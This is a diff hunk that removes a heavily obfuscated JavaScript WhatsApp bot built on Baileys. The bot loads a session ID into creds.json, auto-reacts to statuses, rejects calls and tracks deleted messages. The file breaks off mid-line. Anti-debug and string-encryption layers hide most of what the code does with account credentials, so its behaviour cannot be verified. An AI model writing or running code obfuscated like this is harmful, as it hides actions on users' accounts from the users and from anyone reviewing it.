@@ -1,5 +1,945 @@
-// By Qadeer Ai
-// Protected on: Friday, 19 September 2025 at 1:05:51 am GMT+5
-// Security Level: HARD-ADV
-// --- 
-(function(F,W){function rZ(F,W){return j(F- -0x36a,W);}function rX(F,W){return j(W-0xc3,F);}const e=F();while(!![]){try{const G=parseInt(rX('&4XY',0x662))/0x1*(-parseInt(rZ(-0x152,'L1Eo'))/0x2)+parseInt(rZ(-0xdd,'jF$J'))/0x3*(parseInt(rZ(0xd,'jF$J'))/0x4)+-parseInt(rX('[6DJ',0x4e8))/0x5*(parseInt(rZ(-0x11f,'n)xc'))/0x6)+parseInt(rZ(0x172,'kD3)'))/0x7*(-parseInt(rX('b1Jh',0x62e))/0x8)+parseInt(rZ(0x5f,'qfl['))/0x9+-parseInt(rX('6Gvh',0x251))/0xa*(parseInt(rZ(0x1ce,'uu]K'))/0xb)+parseInt(rZ(-0x108,'k3b4'))/0xc;if(G===W)break;else e['push'](e['shift']());}catch(N){e['push'](e['shift']());}}}(B,0xca393));const S=(function(){let F=!![];return function(W,e){const G=F?function(){function ri(F,W){return j(W-0x78,F);}if(e){const N=e[ri('7liI',0x487)](W,arguments);return e=null,N;}}:function(){};return F=![],G;};}()),Y=S(this,function(){function rh(F,W){return j(F-0x2c7,W);}const W={};W[rh(0x7ce,'aGNO')]=rh(0x3f9,'K@#W');function ra(F,W){return j(F-0x2a9,W);}const e=W;return Y[ra(0x5cb,'DZj@')]()[rh(0x7e6,'[6DJ')](e[ra(0x6ab,'b1Jh')])[ra(0x749,'#@yP')]()[rh(0x744,'DgCj')](Y)[rh(0x6f3,'b1Jh')](e[ra(0x736,'qrUI')]);});Y();const x=(function(){let F=!![];return function(W,e){const G=F?function(){function rP(F,W){return j(W- -0x392,F);}if(e){const N=e[rP(')V19',-0x25a)](W,arguments);return e=null,N;}}:function(){};return F=![],G;};}());(function(){function rf(F,W){return j(W-0x100,F);}const F={'LuyaF':rq('tTKA',-0x176),'Brpfa':rf('FrlN',0x5c9),'WpSrC':function(W,e){return W(e);},'cshwW':function(W,e){return W+e;},'mMggr':rf('YFN*',0x691),'yDwll':function(W,e){return W+e;},'GAMwd':function(W){return W();},'zgvDe':function(W,e,G){return W(e,G);}};function rq(F,W){return j(W- -0x3b5,F);}F[rf('YUh9',0x2dd)](x,this,function(){const W=new RegExp(F[rv('g[45',0x4e3)]);function rv(F,W){return rf(F,W-0x2b9);}function rU(F,W){return rq(W,F-0x40d);}const e=new RegExp(F[rU(0x2bb,'tTKA')],'i'),G=F[rv('^6X@',0x801)](p,rv('DZj@',0x84d));!W[rv('$c1w',0x5fe)](F[rv('#@yP',0x934)](G,F[rv('L1Eo',0x5cb)]))||!e[rv('[ixr',0x6b4)](F[rv('&4XY',0x7fd)](G,rU(0x5ea,'b1Jh')))?F[rv(']edL',0x923)](G,'0'):F[rv('&4XY',0x871)](p);})();}());const T=(function(){let F=!![];return function(W,e){const G=F?function(){function rK(F,W){return j(W- -0x10e,F);}if(e){const N=e[rK(')V19',0x2a)](W,arguments);return e=null,N;}}:function(){};return F=![],G;};}()),r=T(this,function(){const F={'dyqqJ':function(t,d){return t(d);},'qOPFm':function(t,d){return t+d;},'vbELP':rs(0x6a4,'YFN*'),'iOlLL':rz('s^Fc',0x76b),'YKlus':rz('k3b4',0x700),'XraZW':rz('$c1w',0x725),'iALOX':function(t,d){return t<d;}},W=function(){function ru(F,W){return rz(W,F- -0x751);}function rJ(F,W){return rz(W,F- -0x3eb);}let t;try{t=F[rJ(0x49c,'nddH')](Function,F[rJ(0x22d,'k3b4')](F[rJ(0x15d,'q(Fq')](rJ(0x2b3,'FrlN'),F[rJ(0x564,'K@#W')]),');'))();}catch(d){t=window;}return t;};function rz(F,W){return j(W-0x3c4,F);}function rs(F,W){return j(F-0x230,W);}const e=W(),G=e[rs(0x568,'DZj@')]=e[rs(0x677,'jF$J')]||{},N=[rz(']edL',0x77e),F[rz('L1Eo',0x68c)],rz('g[45',0x874),rz('YUh9',0x79f),F[rz(')V19',0x78c)],rs(0x540,']edL'),F[rz('k^n3',0x690)]];for(let t=0x0;F[rz('p(mL',0x625)](t,N[rs(0x6cc,'uu]K')]);t++){const d=T[rz('Fy60',0x6c5)][rz('nddH',0x4d4)][rs(0x659,'nddH')](T),Q=N[t],w=G[Q]||d;d[rs(0x464,'PvnQ')]=T[rz('Cwb0',0x8e1)](T),d[rz('FrlN',0x56d)]=w[rs(0x633,'Cwb0')][rz('jF$J',0x87a)](w),G[Q]=d;}});r();const axios=require(rR(0x58,'$c1w')),config=require(rA('q(Fq',0x155)),{default:makeWASocket,useMultiFileAuthState,DisconnectReason,jidNormalizedUser,isJidBroadcast,getContentType,proto,generateWAMessageContent,generateWAMessage,AnyMessageContent,prepareWAMessageMedia,areJidsSameUser,downloadContentFromMessage,MessageRetryMap,generateForwardMessageContent,generateWAMessageFromContent,generateMessageID,makeInMemoryStore,jidDecode,fetchLatestBaileysVersion,Browsers}=require(config[rR(0x16f,'4FV4')]),l=console[rR(0xc4,'^6X@')],{getBuffer,getGroupAdmins,getRandom,h2k,isUrl,Json,runtime,sleep,fetchJson}=require(rR(0x9f,'K@#W')),{AntiDelDB,initializeAntiDeleteSettings,setAnti,getAnti,getAllAntiDeleteSettings,saveContact,loadMessage,getName,getChatSummary,saveGroupMetadata,getGroupMetadata,saveMessageCount,getInactiveGroupMembers,getGroupMembersMessageCount,saveMessage}=require(rR(0x31f,'7liI')),fs=require('fs'),ff=require(rA('k^n3',0x20f)),P=require(rR(0x28b,'q(Fq')),GroupEvents=require(rA('p(mL',-0xf9)),{PresenceControl,BotActivityFilter}=require(rA('L1Eo',-0x93)),qrcode=require(rA('&4XY',0x76)),StickersTypes=require(rA(']edL',-0x1b5)),util=require(rA('4FV4',-0x1bc)),{sms,downloadMediaMessage,AntiDelete}=require(rR(0x301,'uu]K')),FileType=require(rA('YFN*',0x37)),{File}=require(rA('$c1w',-0x143));(function(){function rE(F,W){return rA(W,F-0x51f);}const F={'VsaHY':function(G,N){return G+N;},'aEGIO':function(G,N){return G+N;},'kBHpT':rM(0x493,'DgCj'),'hAKnY':function(G){return G();}};let W;try{const G=Function(F[rM(0x427,'N[@@')](F[rM(0x488,'fG[m')](F[rM(0x588,'jF$J')],rE(0x394,'qfl[')),');'));W=F[rE(0x5ef,'n)xc')](G);}catch(N){W=window;}function rM(F,W){return rR(F-0x1e1,W);}W[rM(0x4bd,'fG[m')](p,0x7d0);}());const {fromBuffer}=require(rA('^6X@',-0x101)),bodyparser=require(rA('FrlN',0x2d)),os=require('os'),Crypto=require(rR(0x27c,'S[Xd')),path=require(rR(0x42a,'L1Eo')),prefix=config[rA('YUh9',-0xfc)],ownerNumber=[rA('Fy60',-0x14f)],tempDir=path[rR(0x38e,'#@yP')](os[rA('fG[m',0x7)](),rR(0x14e,'nedN'));!fs[rR(0x136,'q(Fq')](tempDir)&&fs[rA('p(mL',-0xc)](tempDir);const clearTempDir=()=>{function rH(F,W){return rR(F-0x224,W);}fs[rH(0x503,'L1Eo')](tempDir,(F,W)=>{function rb(F,W){return rH(F-0x167,W);}if(F)throw F;function ro(F,W){return rH(F- -0x347,W);}for(const e of W){fs[rb(0x48e,'[6DJ')](path[rb(0x414,'p(mL')](tempDir,e),G=>{if(G)throw G;});}});};setInterval(clearTempDir,0x5*0x3c*0x3e8);const express=require(rA('L1Eo',-0x3)),app=express(),port=process[rA('S[Xd',0x1cb)][rA('qfl[',-0x215)]||0x2382,sessionDir=path[rR(0x2ec,'k3b4')](__dirname,rA('4FV4',0xd9)),credsPath=path[rA('6Gvh',0x1b4)](sessionDir,rR(0xc9,'q(Fq'));if(!fs[rR(0x92,'akR7')](sessionDir)){const D={};D[rR(0x452,'yq$D')]=!![],fs[rR(0x29d,'akR7')](sessionDir,D);}function j(r,T){const p=B();return j=function(x,Y){x=x-0x10d;let S=p[x];if(j['zeZnnj']===undefined){var F=function(N){const t='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let d='',Q='',w=d+F;for(let V=0x0,O,C,n=0x0;C=N['charAt'](n++);~C&&(O=V%0x4?O*0x40+C:C,V++%0x4)?d+=w['charCodeAt'](n+0xa)-0xa!==0x0?String['fromCharCode'](0xff&O>>(-0x2*V&0x6)):V:0x0){C=t['indexOf'](C);}for(let y=0x0,l=d['length'];y<l;y++){Q+='%'+('00'+d['charCodeAt'](y)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(Q);};const G=function(N,t){let d=[],Q=0x0,w,V='';N=F(N);let O;for(O=0x0;O<0x100;O++){d[O]=O;}for(O=0x0;O<0x100;O++){Q=(Q+d[O]+t['charCodeAt'](O%t['length']))%0x100,w=d[O],d[O]=d[Q],d[Q]=w;}O=0x0,Q=0x0;for(let C=0x0;C<N['length'];C++){O=(O+0x1)%0x100,Q=(Q+d[O])%0x100,w=d[O],d[O]=d[Q],d[Q]=w,V+=String['fromCharCode'](N['charCodeAt'](C)^d[(d[O]+d[Q])%0x100]);}return V;};j['DUHcrO']=G,r=arguments,j['zeZnnj']=!![];}const D=p[0x0],W=x+D,e=r[W];if(!e){if(j['lQQeIR']===undefined){const N=function(t){this['QibxhQ']=t,this['ydKwVZ']=[0x1,0x0,0x0],this['DMDilt']=function(){return'newState';},this['aLgbdR']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['hSBJmy']='[\x27|\x22].+[\x27|\x22];?\x20*}';};N['prototype']['OaKexY']=function(){const t=new RegExp(this['aLgbdR']+this['hSBJmy']),d=t['test'](this['DMDilt']['toString']())?--this['ydKwVZ'][0x1]:--this['ydKwVZ'][0x0];return this['nydPHu'](d);},N['prototype']['nydPHu']=function(t){if(!Boolean(~t))return t;return this['uQAEOW'](this['QibxhQ']);},N['prototype']['uQAEOW']=function(t){for(let d=0x0,Q=this['ydKwVZ']['length'];d<Q;d++){this['ydKwVZ']['push'](Math['round'](Math['random']())),Q=this['ydKwVZ']['length'];}return t(this['ydKwVZ'][0x0]);},new N(j)['OaKexY'](),j['lQQeIR']=!![];}S=j['DUHcrO'](S,Y),r[W]=S;}else S=e;return S;},j(r,T);}async function loadSession(){const W={};W[rL(0x50c,'YUh9')]=T0(0x6fd,'PZEL'),W[T0(0x580,'7liI')]=T0(0x46d,'8pj0');function T0(F,W){return rR(F-0x457,W);}W[T0(0x708,'[6DJ')]=T0(0x5a0,'6Gvh'),W[T0(0x618,')V19')]=T0(0x587,'Fy60'),W[rL(0x3f7,'4FV4')]=T0(0x812,'[6DJ'),W[T0(0x65c,'PZEL')]=T0(0x86f,'L1Eo'),W[rL(0x344,'q(Fq')]=T0(0x8c4,'kD3)'),W[rL(0xed,'aGNO')]=T0(0x6ad,'K@#W'),W[rL(0x466,'P3G[')]=T0(0x6a7,'k3b4');function rL(F,W){return rR(F-0x85,W);}W[rL(0x1d5,'[6DJ')]=rL(0x2c5,'FrlN'),W[T0(0x712,'#@yP')]=rL(0x48a,'YFN*'),W[rL(0x447,'Cwb0')]=rL(0x19b,'fG[m');const e=W;try{if(!config[T0(0x684,'&4XY')])return console[rL(0x41a,'YFN*')](e[T0(0x7a6,'FrlN')]),null;console[T0(0x828,')V19')](e[T0(0x875,'b1Jh')]);const G=config[T0(0x564,'6Gvh')][rL(0xe3,'[ixr')](e[rL(0x43b,'^6X@')])?config[rL(0x1bd,'FrlN')][T0(0x851,'YUh9')](rL(0x385,'kD3)'),''):config[T0(0x4e8,'akR7')];let N;if(G[T0(0x77a,')V19')](e[T0(0x8ad,'k3b4')])){console[T0(0x7de,'Fy60')](e[rL(0x1e0,'Fy60')]);const t=File[T0(0x83b,'k3b4')](G);N=await new Promise((d,Q)=>{const w={'AnzgH':function(V,O){return V(O);}};function T1(F,W){return T0(W- -0x17a,F);}t[T1('g[45',0x347)]((V,O)=>{function T2(F,W){return T1(F,W- -0x1ae);}function T3(F,W){return T1(F,W-0xfa);}if(V)w[T2('n)xc',0x23f)](Q,V);else w[T2('DZj@',0x31c)](d,O);});}),console[T0(0x828,')V19')](e[rL(0x33b,'$c1w')]);}else{console[T0(0x80e,'P3G[')](e[rL(0x49e,'b1Jh')]);const d=Buffer[rL(0x503,'6Gvh')](G,e[T0(0x6e5,'^6X@')])[rL(0x142,'4FV4')]();N=Buffer[rL(0x87,'aGNO')](d,e[T0(0x542,'L1Eo')]),console[T0(0x4a5,'Snxf')](e[rL(0x31d,'8pj0')]);}return fs[rL(0x36f,'kD3)')](credsPath,N),JSON[T0(0x8e4,'L1Eo')](N[rL(0x204,'k^n3')]());}catch(Q){return console[rL(0x3e5,'Cwb0')](e[rL(0x370,'&4XY')],Q[rL(0x259,'#@yP')]),console[T0(0x7ef,'tTKA')](e[T0(0x813,'k^n3')]),null;}}async function connectToWA(){const W={'Zdqjh':function(w,V){return w===V;},'HRwSn':T4(0x332,'^6X@'),'rLCHM':function(w,V){return w(V);},'JHUZD':function(w,V){return w===V;},'QLzpy':T4(0x3b5,'uu]K'),'oOsaw':function(w,V){return w!==V;},'NQFLj':function(w,V,O){return w(V,O);},'OhsPs':T5(0x335,'FrlN'),'iGioo':T5(0x2e5,'7liI'),'OvaOq':T4(0x235,'YFN*'),'ynriF':T5(0x2d3,'dGmC'),'sGzvH':T4(0x390,'[6DJ'),'HaiMJ':function(w,V){return w!==V;},'nVRuc':function(w,V){return w!==V;},'HdHzo':T4(0x2fe,'$c1w'),'mMuQm':T4(0x70,'b1Jh'),'wgTUF':T5(0x4eb,'p(mL'),'TJjbD':function(w,V,O){return w(V,O);},'SQzNL':function(w,V){return w===V;},'OjCTt':T5(0x372,'DgCj'),'EHBsT':T4(0x5d,')V19'),'deoRs':T5(0x3a7,'yq$D'),'vhGqu':function(w,V){return w===V;},'OaxkR':function(w,V){return w===V;},'ifcew':T4(-0x43,'q(Fq'),'DJCAX':function(w,V){return w===V;},'YdunA':function(w,V){return w===V;},'UTIvL':function(w,V){return w===V;},'YSBfI':T5(0x448,'Fy60'),'NJzcm':T4(0x208,'yq$D'),'CaKNa':T4(0x314,'7liI'),'NWsce':function(w,V){return w*V;},'BTeQW':function(w,V){return w===V;},'MkcYR':T4(0x2c4,'FrlN'),'ZDffv':function(w,V){return w===V;},'fOeQB':function(w,V){return w(V);},'uGZdL':function(w,V,O){return w(V,O);},'dTzcq':function(w,V){return w(V);},'AWcPN':function(w,V){return w==V;},'DphnP':function(w,V){return w!=V;},'fIkOd':function(w,V){return w===V;},'hMWqW':T5(0x365,'uu]K'),'oWwHa':T4(0x36a,'yq$D'),'IbFSo':function(w,V){return w==V;},'QWdzY':T4(0x1a5,'dGmC'),'ORHis':T5(0x54c,'$c1w'),'nXPcV':T5(0x4dd,'8pj0'),'Uxdct':T4(-0x5b,'tTKA'),'zjSRu':T4(0x3ac,'akR7'),'qpUXr':T5(0x3a2,'DZj@'),'NEjAL':function(w,V){return w+V;},'USBgI':function(w,V){return w(V);},'rHjHi':T4(0x2d5,'YUh9'),'quYEl':function(w,V,O){return w(V,O);},'GOgPo':T5(0x514,'s^Fc'),'nwnxI':T5(0x153,'qrUI'),'CtCLZ':function(w,V){return w(V);},'hNFYY':function(w,V){return w===V;},'zAOVV':T4(0x27f,'b1Jh'),'rZqnf':T5(0x546,'fG[m'),'wWrIP':T4(0x28d,'n)xc'),'EMyuJ':T5(0x23d,'k3b4'),'wolff':T4(0x2bd,'qfl['),'NiaeC':T5(0x34a,']edL'),'EHpAh':T5(0x4fe,'s^Fc'),'PBZQM':T4(-0xcc,'k^n3'),'NmKvw':T4(-0x2b,'jF$J'),'khtDm':T5(0x1b6,'YFN*'),'oshpz':T4(0x192,'uu]K'),'hvCfp':T5(0x526,'yq$D'),'XmqBV':T4(0x388,'[6DJ'),'toneo':T4(-0x19,'DZj@'),'VeNhQ':T4(0x15d,'^6X@'),'sWenT':T4(0x186,'akR7'),'CesDi':T4(0x87,'Fy60'),'YqzCu':T4(-0x6c,'q(Fq'),'PEFME':T5(0x437,'Fy60'),'eDSBy':function(w,V){return w===V;},'QAhfx':T5(0x14b,'nedN'),'riTfP':T5(0x295,'PvnQ'),'XUrEN':T4(0x1e5,'4FV4'),'pNVIa':T5(0x2f2,'Fy60'),'xZZAa':T5(0x4b4,'jF$J'),'inkpN':T4(-0xb6,'tTKA'),'QaRsR':T5(0x203,'DZj@'),'dGiVh':T4(0x2cb,'nedN'),'TwboZ':T4(0x183,'s^Fc'),'zRjaE':T5(0x4ff,'nedN'),'IlCwy':T5(0x248,'uu]K'),'jMlmT':T5(0x39e,'YFN*'),'Jeayc':T5(0x460,'P3G['),'eWDFR':T5(0x3fc,'w16Y'),'QxYwd':T4(0x12c,'Fy60'),'JjGvC':T4(0x12f,'qfl['),'yxqEm':T4(-0x26,'p(mL'),'TBeng':T4(0xdc,'Fy60'),'zgCcY':function(w,V){return w*V;},'YaLOG':function(w,V){return w===V;},'RiMwn':T5(0x145,'aGNO'),'TgfSQ':function(w,V){return w===V;},'OPNAo':T4(0x267,'[ixr'),'cFrDQ':function(w,V){return w&&V;},'SRWQG':T4(0x266,'akR7'),'YJXMg':T5(0x3e0,'DgCj'),'jVVEB':function(w,V){return w+V;},'vkOzq':T4(0x11f,'L1Eo'),'GkEmY':function(w,V){return w(V);},'eLDdX':function(w,V){return w+V;},'EiFqF':function(w,V,O,C){return w(V,O,C);},'LXETM':function(w,V,O){return w(V,O);},'pbYkG':function(w,V,O){return w(V,O);},'OqLnU':T4(0x397,'yq$D'),'iooHw':T4(0x1a4,'g[45'),'DNWVv':function(w,V){return w(V);},'ZrwTt':T4(0x19,'YFN*'),'XoKWS':function(w,V){return w(V);},'BUlFm':T5(0x31a,'4FV4'),'OsoPk':function(w,V){return w===V;},'LydXM':T5(0x19b,'uu]K'),'ORaWC':T4(0x2a1,'aGNO'),'fpkFW':T5(0x2d5,'$c1w'),'EcDuR':T4(-0x9e,'fG[m'),'TSCQJ':function(w,V){return w||V;},'cGcLP':function(w,V){return w!==V;},'dOQpN':T4(0xf4,'S[Xd'),'LSFOP':T4(0x22c,'8BvI'),'pxpxJ':T4(-0xa9,'&4XY'),'mdyIa':function(w,V){return w(V);},'yBnNf':T5(0x19a,'aGNO'),'xeKOu':T5(0x506,'qrUI'),'JBZCy':T4(0xad,'akR7'),'HmifV':T4(0xc2,'s^Fc'),'eWojt':T5(0x486,'Cwb0'),'lNjax':function(w,V){return w<=V;},'aRqUc':T4(0x344,'K@#W'),'SEgLC':function(w,V,O){return w(V,O);},'oiEkH':T4(0x92,'nedN'),'wASPP':function(w,V,O){return w(V,O);},'TgmZX':function(w,V){return w(V);},'rouqM':function(w,V,O){return w(V,O);},'FjRFr':function(w,V,O,C){return w(V,O,C);},'UuuQP':T4(0x291,'4FV4'),'kZluf':T4(0x44,'qrUI'),'DmAPY':T5(0x381,'p(mL'),'ReLgO':function(w,V){return w+V;},'NWthk':T4(0x12e,'$c1w'),'sPjUG':T5(0x3bf,'DgCj'),'eBAUr':T5(0x4fd,'[ixr'),'UaPYt':function(w){return w();},'KqWBC':function(w,V,O){return w(V,O);},'lYlsy':T4(0x2d2,'$c1w'),'lCXJn':T4(-0xc2,'^6X@'),'syvQF':T4(-0xe,'p(mL'),'WECbx':T4(0x17d,'$c1w'),'ALrSB':T4(0x284,'k3b4'),'zyzdD':function(w,V){return w(V);},'pnRAk':T5(0x465,'qfl[')};console[T5(0x362,'N[@@')](W[T5(0x585,'s^Fc')]);const e=await W[T4(-0x9f,'s^Fc')](loadSession),{state:G,saveCreds:N}=await W[T4(0x2aa,'PZEL')](useMultiFileAuthState,path[T4(-0x58,'qfl[')](__dirname,T5(0x57a,'dGmC')),{'creds':W[T4(0x355,'k^n3')](e,undefined)}),{version:t}=await W[T4(0x198,'qrUI')](fetchLatestBaileysVersion),d={};d[T5(0x5d5,'YFN*')]=T5(0x498,'w16Y');function T4(F,W){return rA(W,F-0x162);}const Q=W[T5(0x577,'dGmC')](makeWASocket,{'logger':W[T4(0x272,'8BvI')](P,d),'printQRInTerminal':!e,'browser':Browsers[T5(0x435,'n)xc')](T4(0x351,'$c1w')),'syncFullHistory':!![],'auth':G,'version':t,'getMessage':async()=>({})});Q['ev']['on'](W[T5(0x1c0,'DgCj')],async w=>{const V={'yAXBR':function(g,I){function T6(F,W){return j(W-0x2ed,F);}return W[T6('qfl[',0x776)](g,I);},'fvnhG':W[T7('uu]K',0x302)],'TmIJD':function(y,g){function T8(F,W){return T7(F,W-0x8d);}return W[T8('S[Xd',0x40)](y,g);}},{connection:O,lastDisconnect:C,qr:n}=w;if(W[T9(0x175,'akR7')](O,W[T7('n)xc',0x5f)]))W[T7('k^n3',0x116)](C[T9(-0x18,'YFN*')]?.[T7('&4XY',0x221)]?.[T7('4FV4',0x1fc)],DisconnectReason[T9(-0x11,'^6X@')])?(console[T9(0x3aa,'YUh9')](T7('N[@@',0x1be)),W[T9(0x19a,'8BvI')](setTimeout,connectToWA,0x1388)):console[T7('[6DJ',0x1f)](T7('fG[m',0x51));else{if(W[T9(0x8d,'K@#W')](O,W[T9(0x36f,'PvnQ')])){console[T7('kD3)',0x365)](W[T9(0x7,'YFN*')]);const y=path[T7('fG[m',0x169)](__dirname,W[T7('g[45',0x29a)]);fs[T9(0x148,'8BvI')](y)[T9(0x17b,'akR7')](g=>{function TT(F,W){return T9(W-0x49b,F);}function Tr(F,W){return T7(F,W-0x21a);}V[Tr('PZEL',0x4a0)](path[TT('q(Fq',0x592)](g)[TT('8pj0',0x538)](),V[TT('7liI',0x5ad)])&&V[TT('dGmC',0x79f)](require,path[TT('dGmC',0x7dd)](y,g));}),console[T9(0x3d6,'FrlN')](T7('$c1w',0xbe));try{const g=config[T9(0x160,'jF$J')][T7('&4XY',0x3c9)]('/')[T7('n)xc',0xae)](0x3,0x4)[0x0],I=T7('Fy60',0x398)+g,m=T9(0x15d,'8BvI'),c={};c[T9(0x28,'^6X@')]=T7('7liI',0x2a2);const k={};k[T7('N[@@',0xf2)]=c,k[T7('jF$J',0x7f)]=m,await Q[T7('N[@@',-0x8a)](Q[T7('[ixr',0x34b)]['id'],k);}catch(X){console[T7('P3G[',0x17d)](W[T9(0x2a4,'n)xc')],X);}}}function T7(F,W){return T4(W-0x18,F);}function T9(F,W){return T5(F- -0x1bf,W);}n&&console[T7('S[Xd',0xe5)](T7('n)xc',0x32a));}),Q['ev']['on'](W[T4(0x1f7,'Cwb0')],N),Q['ev']['on'](W[T4(-0x8b,'aGNO')],async w=>{function Tx(F,W){return T5(F-0x15c,W);}function Tp(F,W){return T4(F- -0x17c,W);}for(const V of w){V[Tp(-0xab,'nddH')][Tx(0x596,'PvnQ')]===null&&(console[Tx(0x35e,'^6X@')](W[Tx(0x5b1,'g[45')],JSON[Tx(0x3f6,'w16Y')](V,null,0x2)),await AntiDelete(Q,w));}}),Q['ev']['on'](W[T5(0x451,'tTKA')],async w=>{function TY(F,W){return T4(F-0x2be,W);}function TS(F,W){return T4(F-0x502,W);}try{if(W[TY(0x535,'L1Eo')](config[TS(0x624,'Cwb0')],TY(0x4b8,'Fy60')))return;for(const V of w){if(W[TY(0x600,'DZj@')](V[TS(0x4c8,'PvnQ')],W[TY(0x1e9,'kD3)')]))continue;const O=V['id'],C=V[TY(0x43d,'PZEL')];await Q[TS(0x67e,'YUh9')](O,C);const n={};n[TS(0x7fe,'S[Xd')]=config[TS(0x7fb,'akR7')]||W[TS(0x4f9,'^6X@')],await Q[TS(0x778,'FrlN')](C,n),console[TS(0x7e0,'qfl[')](TS(0x52e,'6Gvh')+C);}}catch(y){console[TY(0x2b1,'8pj0')](W[TY(0x3d3,'S[Xd')],y);}}),Q['ev']['on'](W[T5(0x4cb,'YFN*')],async w=>{function TB(F,W){return T4(F-0xb7,W);}await W[TB(0x22f,'N[@@')](PresenceControl,Q,w);}),Q['ev']['on'](W[T4(0x16c,'qfl[')],w=>PresenceControl(Q,w)),W[T5(0x1bf,'nedN')](BotActivityFilter,Q),Q['ev']['on'](W[T4(0x278,'tTKA')],async w=>{const V={'FHVHK':function(rx,rY){function Tj(F,W){return j(F-0x295,W);}return W[Tj(0x54a,'7liI')](rx,rY);},'NtNfp':function(rx,rY){return rx!==rY;},'vtkeo':function(rx,rY){return rx(rY);},'XFjsI':function(rx,rY){function TF(F,W){return j(F- -0xc,W);}return W[TF(0x3a0,']edL')](rx,rY);},'aKQos':W[TD(0x2ed,'jF$J')],'uzYLt':TD(0x40a,'8BvI'),'cLcnq':function(rx,rY){return rx===rY;},'QULnN':W[TD(0x42e,'8pj0')],'OYTpP':W[TD(0x679,'yq$D')],'xNVHm':TD(0x4eb,'8pj0'),'OMCfJ':function(rx,rY){function Te(F,W){return TW(W,F- -0x503);}return W[Te(-0x5e,'P3G[')](rx,rY);},'uYbVV':TW(')V19',0x716)};w=w[TW('[ixr',0x74a)][0x0];if(!w[TW('Snxf',0x54d)])return;w[TD(0x5dd,'dGmC')]=W[TW('PvnQ',0x3ff)](getContentType(w[TD(0x379,'g[45')]),W[TW(')V19',0x3bd)])?w[TD(0x606,'s^Fc')][TD(0x62a,'Snxf')][TW('yq$D',0x36a)]:w[TD(0x478,'qrUI')];W[TW('N[@@',0x753)](config[TW('jF$J',0x6d7)],TD(0x680,'tTKA'))&&(await Q[TD(0x41a,'fG[m')]([w[TD(0x513,'Fy60')]]),console[TW('K@#W',0x4ec)](TW('akR7',0x4c8)+w[TW('g[45',0x65d)][TD(0x441,'L1Eo')]+TW('K@#W',0x561)));if(w[TD(0x3ec,'aGNO')][TD(0x50a,'&4XY')])w[TD(0x30f,')V19')]=W[TW('akR7',0x4cf)](W[TD(0x4c4,'uu]K')](getContentType,w[TW('S[Xd',0x6be)]),TD(0x44f,'YUh9'))?w[TW('[ixr',0x7a3)][TD(0x4e9,'4FV4')][TD(0x553,'K@#W')]:w[TW('[ixr',0x7a3)];w[TD(0x624,'YUh9')]&&W[TD(0x58e,'jF$J')](w[TD(0x61d,'^6X@')][TW('6Gvh',0x7c9)],W[TD(0x4c7,'#@yP')])&&W[TW('kD3)',0x367)](config[TD(0x4b1,'PZEL')],W[TD(0x61b,'qfl[')])&&await Q[TD(0x4b0,'g[45')]([w[TD(0x401,'p(mL')]]);const O=[W[TW('6Gvh',0x52f)]],C=['❤️','👍','😮','😎','💀'];if(w[TW('L1Eo',0x57e)]&&O[TW('nddH',0x4e3)](w[TW('PZEL',0x683)][TD(0x398,'yq$D')]))try{const rx=w[TD(0x662,'Snxf')];if(rx){const rY=C[Math[TD(0x6c1,'YUh9')](W[TW('dGmC',0x65e)](Math[TW('S[Xd',0x590)](),C[TW('nedN',0x3e2)]))];await Q[TW('qfl[',0x51c)](w[TD(0x472,'nddH')][TD(0x69e,'nddH')],rx[TD(0x685,'qfl[')](),rY);}}catch(rS){}function TW(F,W){return T4(W-0x437,F);}if(w[TD(0x2fc,'8pj0')]&&W[TW('akR7',0x4e8)](w[TD(0x39f,'#@yP')][TW('L1Eo',0x55e)],W[TD(0x340,'[6DJ')])&&W[TW('DgCj',0x5d6)](config[TD(0x601,'4FV4')],TW('n)xc',0x45f))){const rB=await Q[TD(0x53d,'kD3)')](Q[TD(0x29d,'$c1w')]['id']),rj=['❤️','💸','😇','🍂','💥','💯','🔥','💫','💎','💗','🤍','🖤','👀','🙌','🙆','🚩','🥰','💐','😎','🤎','✅','🫀','🧡','😁','😄','🌸',W[TD(0x50d,'aGNO')],'🌷','⛅','🌟','🗿',TD(0x584,'PZEL'),'💜','💙','🌝','🖤','💚'],rF=rj[Math[TW('8BvI',0x795)](W[TD(0x266,'nedN')](Math[TD(0x393,'fG[m')](),rj[TW('PZEL',0x35c)]))];await Q[TD(0x337,'dGmC')](w[TW('uu]K',0x3d8)][TW('8pj0',0x78d)],{'react':{'text':rF,'key':w[TW('7liI',0x542)]}},{'statusJidList':[w[TW('7liI',0x542)][TD(0x454,'[ixr')],rB]});}if(w[TW('DZj@',0x55f)]&&W[TD(0x48f,'Fy60')](w[TW('b1Jh',0x572)][TD(0x516,'k^n3')],TW('DgCj',0x615))&&config[TW('dGmC',0x502)]===W[TW('q(Fq',0x361)]){const rD=w[TW('n)xc',0x63c)][TD(0x63b,'PZEL')],rW=''+config[TD(0x609,'akR7')],re={};re[TW('&4XY',0x4fb)]='💜',re[TW('fG[m',0x5be)]=w[TD(0x290,'P3G[')];const rG={};rG[TD(0x3de,'&4XY')]=rW,rG[TW('S[Xd',0x40d)]=re;const rN={};rN[TD(0x324,'DZj@')]=w,await Q[TW('nddH',0x406)](rD,rG,rN);}await Promise[TD(0x29b,'8pj0')]([W[TW('p(mL',0x479)](saveMessage,w)]);const n=W[TD(0x4c3,'^6X@')](sms,Q,w),y=W[TD(0x25a,'n)xc')](getContentType,w[TD(0x537,'PvnQ')]),g=JSON[TD(0x32c,'q(Fq')](w[TW('N[@@',0x593)]),I=w[TW('q(Fq',0x7ca)][TD(0x631,'S[Xd')],c=W[TD(0x287,'7liI')](y,TD(0x33c,'qrUI'))&&W[TW('[6DJ',0x486)](w[TD(0x386,'4FV4')][TW('&4XY',0x43d)][TW('w16Y',0x533)],null)?w[TD(0x60e,'DgCj')][TD(0x5df,'Fy60')][TW('DgCj',0x3a7)][TD(0x285,'g[45')]||[]:[],k=W[TW('6Gvh',0x568)](y,W[TD(0x3ae,'Snxf')])?w[TW('&4XY',0x725)][TD(0x50c,'g[45')]:y===W[TD(0x4ae,'nedN')]?w[TD(0x274,'k^n3')][TW('k^n3',0x467)][TW('fG[m',0x3a9)]:W[TD(0x378,'N[@@')](y,W[TD(0x3df,'Cwb0')])&&w[TD(0x3dd,'jF$J')][TW('k3b4',0x518)][TW('FrlN',0x697)]?w[TD(0x5a1,'S[Xd')][TW('FrlN',0x778)][TD(